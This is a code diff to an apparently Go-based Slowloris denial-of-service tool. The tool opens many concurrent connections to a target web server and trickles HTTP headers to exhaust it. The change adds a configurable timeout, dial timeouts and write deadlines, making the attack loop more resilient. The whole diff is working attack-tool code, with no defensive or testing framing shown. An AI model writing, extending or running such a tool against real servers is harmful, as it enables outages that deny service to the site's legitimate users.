@@ -19,6 +19,7 @@ const (
 var (
 	numConnections int
 	interval       int
+	timeout        int
 	method         string
 	resource       string
 	userAgent      string
@@ -39,7 +40,7 @@ func main() {
 		target += ":80"
 	}
 
-	openConnections(target, numConnections)
+	openConnections(target, numConnections, timeout)
 
 	signal.Notify(signals, os.Interrupt, os.Kill)
 
@@ -56,6 +57,7 @@ loop:
 func parseParams() {
 	flag.IntVar(&numConnections, "connections", 10, "Number of active concurrent connections")
 	flag.IntVar(&interval, "interval", 1, "Number of seconds to wait between sending headers")
+	flag.IntVar(&timeout, "timeout", 60, "Timeout in seconds")
 	flag.StringVar(&method, "method", "GET", "HTTP method to user")
 	flag.StringVar(&resource, "resource", "/", "Resource to request from the server")
 	flag.StringVar(&userAgent, "useragent", defaultUserAgent, "User-Agent header of the request")
@@ -72,17 +74,18 @@ func usage() {
 	fmt.Println("")
 }
 
-func openConnections(target string, num int) {
+func openConnections(target string, num, timeout int) {
 	for i := 0; i < num; i++ {
-		go slowloris(target, interval)
+		go slowloris(target, interval, timeout)
 	}
 }
 
-func slowloris(target string, interval int) {
+func slowloris(target string, interval, timeout int) {
+	timeoutDuration := time.Duration(timeout) * time.Second
 
 loop:
 	for {
-		conn, err := net.Dial("tcp", target)
+		conn, err := net.DialTimeout("tcp", target, timeoutDuration)
 		if err != nil {
 			continue
 		}
@@ -91,6 +94,8 @@ loop:
 		host := target
 		headers := makeHeaders(host)
 		req := createRequest(host, method, resource, headers)
+
+		conn.SetWriteDeadline(time.Now().Add(timeoutDuration))
 		_, err = io.Copy(conn, req)
 		if err != nil {
 			continue
